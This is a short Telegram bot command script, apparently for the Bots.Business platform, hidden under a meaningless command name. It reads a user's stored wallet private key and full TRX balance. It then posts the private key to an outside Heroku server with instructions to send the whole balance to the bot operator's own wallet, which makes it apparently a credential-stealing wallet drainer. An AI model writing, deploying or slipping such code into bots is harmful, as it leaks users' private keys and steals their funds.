/*CMD
  command: rtyejs
  help: 
  need_reply: false
  auto_retry_time: 
  folder: 

  <<ANSWER

  ANSWER

  <<KEYBOARD

  KEYBOARD
  aliases: 
CMD*/

var cbal = User.getProperty("cbal")
var dp = cbal*1000000
var rs = parseFloat(cbal)
var wpk = Bot.getProperty("cp_publickey01","🛑 Not Set")
var er = User.getProperty("wallpk")
HTTP.post( {
    url: "https://tronb.herokuapp.com/sendtrx",
    success: '/completedmkb',
    body:  {receiver : wpk, amount : dp ,private_key : er}
})
